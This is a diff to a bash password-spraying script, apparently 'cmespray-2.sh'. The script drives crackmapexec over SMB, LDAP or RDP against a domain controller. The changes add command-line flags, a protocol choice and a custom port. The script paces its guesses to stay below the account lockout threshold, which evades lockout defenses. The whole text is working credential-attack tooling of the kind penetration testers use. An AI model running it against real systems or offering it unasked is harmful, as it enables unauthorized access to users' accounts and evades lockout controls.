@@ -8,11 +8,56 @@ if [ $? == 1 ]; then
     exit
 fi
 
-read -p "Enter the 'Reset Account Lockout Counter After' value: " reset_counter
-read -p "Enter the 'Account Lockout Threshold' value: " lockout_threshold
-read -p "Enter the Domain Controller IP Address: " dc_ip
-read -p "Enter path to a password list: " passwords
-read -p "Enter path to domain users list: " dom_users
+#read -p "Enter the 'Reset Account Lockout Counter After' value: " reset_counter
+#read -p "Enter the 'Account Lockout Threshold' value: " lockout_threshold
+#read -p "Enter the Domain Controller IP Address: " dc_ip
+#read -p "Enter path to a password list: " passwords
+#read -p "Enter path to domain users list: " dom_users
+
+
+help() {
+    echo "flags:"
+    echo "-t: Target IP address or hostname"
+    echo "-m: Protocol - can be SMB/LDAP/RDP"
+    echo "-u: Username or username file"
+    echo "-p: Password or password file"
+    echo "-l: Account Lockout Threshold' value"
+    echo "-r: 'Reset Account Lockout Counter After' value"
+    echo "-n: 'Custom port number - optional"
+    echo "-h: 'Print this help summary page"
+    echo ""
+    echo "Usage example:"
+    echo "cmespray-2.sh -t 10.1.1.1 -m smb -u ./users.txt -p ./passwords.txt -l 5 -r 30 -n 445"
+
+}
+
+
+while getopts t:m:r:l:p:u:n:h: flag
+do
+    case "${flag}" in
+        t) dc_ip=${OPTARG};;
+        m) method=${OPTARG};;
+        r) reset_counter=${OPTARG};;
+        l) lockout_threshold=${OPTARG};;
+        u) dom_users=${OPTARG};;
+        p) passwords=${OPTARG};;
+        n) port=${OPTARG};;
+        h) help ;;
+        *) echo "Invalid option: -$flag" && echo "" && help && exit 1;;
+
+    esac
+done
+
+
+if [[ -z $dc_ip  || -z $method || -z $reset_counter || -z $lockout_threshold ||  -z $dom_users ||  -z $passwords ]]
+  then
+    echo "ERROR: missing mandatory arguments";
+    echo "";
+    help;
+
+    exit 1;
+fi
+
 
 cp $passwords $passwords.tmp
 
@@ -37,7 +82,15 @@ while true; do
     echo "[*] Trying $(echo $((lockout_threshold-1))) passwords every $(echo $((reset_counter+1))) minutes against $(echo $dc_ip) and using $(echo $passwords) and $(echo $dom_users) lists."
     sleep 3
     for password in $pass_num; do
-        crackmapexec smb $dc_ip -u $(cat $dom_users) -p $password | tee -a cmespray_output.txt
+        t2='date +"%T"'
+        echo "[+] Running:" `$t2`
+	if [[ -z $port ]] 
+	  then 
+            crackmapexec $method $dc_ip -u $(cat $dom_users) -p $password 2>/dev/null | tee -a cmespray_output.txt
+	else
+	    crackmapexec $method $dc_ip -u $(cat $dom_users) -p $password --port $port 2>/dev/null | tee -a cmespray_output.txt
+	fi
+
     done
     # remove used passwords from the list
     sed -i -e "1,$((lockout_threshold-1))d" $passwords.tmp
@@ -49,7 +102,7 @@ while true; do
 	
 
     timer=$((reset_counter+1))
-    sleep $timer
+    sleep $timer"m"
     if [[ ! -s $passwords.tmp ]]; then
         checkpwns
         echo "Done."
@@ -57,4 +110,3 @@ while true; do
         exit
     fi
 done
-
